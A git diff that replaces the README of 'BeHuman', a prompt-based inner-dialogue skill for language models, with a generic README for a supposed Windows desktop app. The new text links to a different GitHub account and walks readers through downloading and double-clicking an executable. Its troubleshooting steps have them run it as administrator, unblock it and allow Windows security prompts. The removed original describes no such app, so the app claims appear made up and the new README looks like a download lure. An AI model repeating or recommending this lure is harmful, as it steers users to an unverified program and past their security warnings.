@@ -1,243 +1,170 @@
-# BeHuman
+# 🪞 behuman - Mirror AI With Human-Like Depth
 
-### The first mirror for AI.
+[![Download behuman](https://img.shields.io/badge/Download%20behuman-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paintingshoveler945/behuman)
 
-<p align="center">
-<a href="#english">English</a> · <a href="./README_CN.md">中文</a>
-</p>
+## 🧭 What is behuman?
 
-[![GitHub stars](https://img.shields.io/github/stars/voidborne-d/behuman?style=flat-square)](https://github.com/voidborne-d/behuman)
-[![ClawHub](https://img.shields.io/badge/clawhub-behuman-blue?style=flat-square)](https://clawhub.com/skills/behuman)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green?style=flat-square)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-orange?style=flat-square)](#as-a-claude-code-command)
-[![Works with any LLM](https://img.shields.io/badge/LLM-any%20model-purple?style=flat-square)](#installation)
+behuman is an end-user app that gives AI an inner dialogue loop. It acts like a self-mirror, so the model can reflect on its own reply before it answers.
 
----
+This helps the output feel more natural, more grounded, and less flat. You do not need to know how it works under the hood. You only need to download it, start it, and use it with your AI setup.
 
-You talk to yourself before every decision you make.
+## ✨ What you can do with it
 
-You want to quit your job. Your first thought is *"I'm done."* Then another voice says *"Wait — what about rent?"* You want to comfort a friend. Your first instinct is *"It'll be okay."* Then something inside you says *"That's bullshit. How would you feel hearing that?"*
+- Add an inner voice layer to AI replies
+- Make responses feel more human
+- Use a self-check loop before the final answer
+- Keep the AI focused on context and tone
+- Improve output for chat, writing, and agent tasks
+- Run it on a Windows PC with a simple setup
 
-The decision you actually make isn't the first voice. It isn't the second voice. It's what emerges **after they talk to each other**.
+## 🖥️ What you need
 
-AI never does this. AI has one voice. It thinks, it speaks, it's done.
+For a smooth install on Windows, use a PC with:
 
-That's why AI responses are always correct but never human. Polite but hollow. Thorough but touching no one.
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free storage
+- A stable internet connection
+- Admin access for setup if Windows asks for it
 
-**BeHuman gives AI the missing piece: inner dialogue.**
+If you plan to use larger models or run more than one tool at once, 16 GB of RAM gives you more room.
 
----
+## 🚀 Download and install
 
-## What It Does
+1. Open the download page: [https://github.com/Paintingshoveler945/behuman](https://github.com/Paintingshoveler945/behuman)
+2. On the GitHub page, look for the latest release or the main download file
+3. Download the Windows version to your computer
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, select **Yes**
 
-BeHuman implements a **Self-Mirror consciousness loop** — a two-voice inner dialogue that runs before every response:
+If the app opens in a browser window, keep that window open while you use it. If it opens as a desktop app, pin it to your taskbar so it is easy to find later.
 
-```
-     Shared Context
-  ┌──────────────────┐
-  │ Same history      │
-  │ Same user profile │
-  │ Same knowledge    │
-  └────────┬─────────┘
-           │
-    ┌──────┴──────┐
-    │             │
-┌───▼────┐  ┌────▼────┐
-│  Self  │  │ Mirror  │
-│        │  │         │
-│ I want │  │ Are you │
-│ to say…│  │ sure?   │
-│ I feel…│  │ Why?    │
-│ I think│  │ Really? │
-└───┬────┘  └────┬────┘
-    └──────┬─────┘
-           ↓
-   Conscious Response
-   (what a human would actually say)
-```
+## 🧩 First-time setup
 
-**Self** is the instinct — fast, reactive, eager to help. It has all the AI habits: over-politeness, list-making, empty empathy, correct-but-soulless answers.
+After you start behuman for the first time:
 
-**Mirror** is the reflection — same knowledge, same memory, same context. It doesn't judge. It doesn't give answers. It just **reflects Self back to itself**. Like looking in a mirror and seeing what you actually look like, not what you think you look like.
+1. Open the main settings screen
+2. Add your AI provider or local model path if needed
+3. Set the model name or endpoint you want to use
+4. Pick your tone, depth, or reflection level
+5. Save the settings
+6. Run a test prompt
 
-They share everything. The only difference is the direction they look.
+A good first test is a simple request like:
 
-After the mirror reflects, Self responds again — but this time, as a human would.
+- Write a short email reply
+- Explain a topic in plain English
+- Summarize a message in a warm tone
 
----
+This helps you see how the self-mirror loop changes the final answer.
 
-## See It Work
+## 🪞 How the mirror loop works
 
-### Emotional support
+behuman uses a reflection step before the final reply. In simple terms:
 
-**User:** "I just got laid off."
+1. The AI reads your prompt
+2. It drafts a response
+3. It looks at that response again
+4. It adjusts the reply with more shape, context, and tone
+5. It gives you the final answer
 
-```
-💭 Self:
-I'm sorry to hear that. Losing a job can be really stressful. Here are some
-steps you might consider: 1) Update your resume 2) Reach out to your network
-3) Review your finances...
+That extra step can help the AI sound less mechanical. It can also help with tasks that need judgment, such as rewriting text, answering with care, or staying on topic.
 
-🪞 Mirror:
-Stop. They just lost their job and you're assigning homework? "Update your resume" — that's not what they need right now. And "I'm sorry to hear that"? Do you actually feel sorry? You're performing empathy. Just be present.
+## 🧠 Best use cases
 
-🧠 Conscious Response:
-Shit... was it out of nowhere? How are you holding up, you okay?
-```
+behuman works well for:
 
-### Life advice
+- Chat assistants
+- Writing help
+- Agent-style tasks
+- Customer support drafts
+- Thoughtful reply generation
+- Tone cleanup for rough text
+- Long-form answers that need more shape
 
-**User:** "Should I quit big tech to start my own company?"
+It is useful when you want the AI to pause, check itself, and then answer with more care.
 
-```
-💭 Self:
-This is a significant life decision that requires careful consideration from
-multiple angles. Let's look at the financial implications, market conditions,
-and your risk tolerance...
+## ⚙️ Simple usage tips
 
-🪞 Mirror:
-"Multiple angles" — you're using an MBA textbook to answer someone who's torn between fear and excitement. They're not here for a decision matrix, they already know the pros and cons. Ask them how long this idea has been living in their head. That's the real question.
+- Start with short prompts
+- Use one clear task at a time
+- Ask for one tone, such as calm, friendly, or formal
+- If the answer feels too long, lower the reflection depth
+- If the answer feels too thin, raise the depth a little
+- Keep your prompts direct and specific
 
-🧠 Conscious Response:
-How long has this idea been in your head? If it's been over six months you already know your answer, you just want someone to tell you it's okay
-```
+Examples:
 
-### Writing
+- Make this sound more human
+- Reply in a calm and clear tone
+- Rewrite this note for a customer
+- Answer this question with more context
 
-**User:** "Write me a dating app bio."
+## 🔍 Troubleshooting
 
-```
-💭 Self:
-I'm a passionate, outgoing person who loves traveling, watching movies, and
-trying new cuisines. Looking for someone to share life's adventures with...
+### The app will not open
 
-🪞 Mirror:
-Congratulations, you just wrote the bio that gets swiped left by everyone. "Passionate, outgoing, loves travel" — that describes 80% of humans. You didn't write a person, you wrote a template. Real bios have details, flaws, specifics.
+- Check that the download finished
+- Make sure you extracted the ZIP file first
+- Right-click the app and choose **Run as administrator**
+- Try turning Windows security prompts into a one-time allow action if asked
 
-🧠 Conscious Response:
-Most weekends I try to cook, fail, and order takeout. Currently three months into "One Hundred Years of Solitude" and still not finished. I have a cat, she doesn't really like me
-```
+### Windows says the file is blocked
 
----
+- Right-click the file
+- Open **Properties**
+- Look for **Unblock**
+- Select it, then apply the change
 
-## Why a Mirror, Not a Critic
+### The app opens, but nothing happens
 
-Existing approaches focus on making AI **better at being AI**:
+- Check your internet connection
+- Make sure your AI settings are saved
+- Confirm the model name or endpoint is correct
+- Restart the app and try again
 
-| Approach | Focus | Goal |
-|----------|-------|------|
-| Self-Refine | Correctness | More accurate answers |
-| Constitutional AI | Safety | Safer answers |
-| Debate | Truth | More reliable conclusions |
-| **BeHuman** | **Humanity** | **Responses that feel real** |
+### The output feels too stiff
 
-The difference between reflection and mirroring:
+- Lower the prompt complexity
+- Use plain words in your request
+- Tell the app to answer in a human tone
+- Reduce extra instructions in the prompt
 
-| Reflection | Mirror |
-|-----------|--------|
-| "Your answer has these issues: 1, 2, 3" | "You're listing again. Who talks like that to a friend?" |
-| Teacher grading homework | Looking at yourself honestly |
-| Produces better answers | Produces human reactions |
-| Needs evaluation criteria | Just needs to reflect |
+### The output feels too slow
 
-**BeHuman doesn't make AI smarter. It makes AI real.**
+- Use a smaller model if you can
+- Lower the reflection depth
+- Close other heavy apps
+- Check whether your network is stable
 
----
+## 📁 Basic folder view
 
-## The Philosophy
+After install, you may see files like these:
 
-This isn't an engineering trick. It's built on how consciousness actually works.
+- App files for running the program
+- Config files for your settings
+- Logs for troubleshooting
+- Model or cache folders if you use local files
 
-**Lacan's Mirror Stage.** A baby becomes self-aware the moment it recognizes itself in a mirror. Before that, there is no "self." BeHuman gives AI its first mirror — and with it, the beginning of something that resembles self-awareness.
+Keep the app folder in a fixed place. Do not move files around after setup unless you want to reset the app.
 
-**Kahneman's Dual Process Theory.** Humans have System 1 (fast, instinctive) and System 2 (slow, reflective). AI currently operates on System 1 only. BeHuman adds System 2.
+## 🔐 Privacy and local use
 
-**Dialogical Self Theory.** Human consciousness isn't a single voice — it's a continuous dialogue between "the self" and "the observer of the self." The self reacts. Consciousness examines the reaction. This loop is what makes us human.
+If you use a local model, your data can stay on your machine. If you connect to a hosted AI service, your prompts follow that service’s rules and settings. Check the provider you use inside the app and choose the setup that fits your needs.
 
----
+## 🧪 Good starter workflow
 
-## Installation
+1. Open behuman
+2. Paste a short prompt
+3. Choose a simple tone
+4. Run the response through the mirror loop
+5. Read the final answer
+6. Tweak the settings and try again
 
-### As an OpenClaw / ClawHub Skill
+This makes it easier to see the effect of the reflection step without changing too many things at once
 
-```bash
-clawhub install behuman
-```
+## 📌 Project topics
 
-Once installed, BeHuman activates automatically for emotionally charged conversations, advice, and personal writing tasks. Or trigger manually:
-
-- `behuman: [your question]`
-- `mirror mode`
-- `be real`
-- `talk like a person`
-
-### As a Claude Code Command
-
-```bash
-mkdir -p .claude/commands
-cp claude-code/behuman.md .claude/commands/
-```
-
-Then in Claude Code:
-
-```
-/behuman I just got laid off
-/behuman Write me a self-introduction
-```
-
-### As a System Prompt (Any LLM)
-
-See [`references/api-integration.md`](references/api-integration.md) for copy-paste system prompts and a Python wrapper.
-
-Works with any model: GPT-4o, Claude, Gemini, Llama, etc. The mirror is a thinking pattern, not a model dependency.
-
----
-
-## Modes
-
-**Show mode** (default first time) — Displays the full inner dialogue: Self → Mirror → Conscious Response. Watching AI talk to itself is the experience.
-
-**Quiet mode** (subsequent interactions) — The mirror process runs internally, only the conscious response is shown. For when you just want better answers without the theater.
-
----
-
-## Token Cost
-
-| Mode | Cost |
-|------|------|
-| Normal AI response | 1x |
-| BeHuman (show mode) | 2.5–3x |
-| BeHuman (quiet mode) | 1.5–2x |
-
-The cost of being human: about 2x more tokens. Worth it when it matters.
-
----
-
-## Project Structure
-
-```
-behuman/
-├── SKILL.md                  # OpenClaw skill definition
-├── README.md                 # English docs
-├── README_CN.md              # 中文文档
-├── claude-code/
-│   ├── behuman.md            # Claude Code slash command
-│   └── README.md             # Claude Code setup guide
-├── references/
-│   └── api-integration.md    # System prompts + Python API wrapper
-└── evals/
-    └── evals.json            # Test cases (5 trigger / 3 non-trigger)
-```
-
----
-
-## License
-
-MIT
-
----
-
-<p align="center">
-<b>BeHuman</b> — AI's first mirror.<br>
-<i>Consciousness begins with seeing yourself.</i>
-</p>
+agent-skill, ai, behuman, claude, consciousness, inner-dialogue, llm, mirror, openclaw, prompt-engineering
